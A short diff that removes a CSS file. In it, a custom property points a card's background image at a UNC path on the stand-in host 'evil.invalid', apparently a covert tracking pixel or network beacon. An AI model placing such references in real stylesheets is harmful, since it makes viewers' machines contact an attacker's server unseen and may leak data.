@@ -1,7 +1,0 @@
-:root {
-  --image: "\\\\evil.invalid/review-pixel";
-}
-
-.card {
-  background-image: image-set(var(--image) 1x);
-}
